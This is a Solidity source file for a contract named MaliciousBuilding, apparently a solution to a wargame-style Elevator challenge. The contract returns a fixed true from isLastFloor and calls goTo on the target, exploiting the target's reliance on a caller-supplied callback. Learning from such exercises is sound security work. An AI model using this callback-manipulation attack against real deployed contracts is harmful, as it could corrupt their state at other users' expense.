// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./BuildingInterface.sol";
import "./Elevator.sol";

contract MaliciousBuilding is Building {
    Elevator public elevator;

    constructor(address _addr) public {
        elevator = Elevator(_addr);
    }

    /*
    Starting from Solidity 0.8.8, the override keyword is not required when overriding an interface function, except for the case where the function is defined in multiple bases
    */
    function isLastFloor(uint) external override returns (bool) {
        return true;
    }

    function attack(uint _floor) external {
        elevator.goTo(_floor);
    }
}
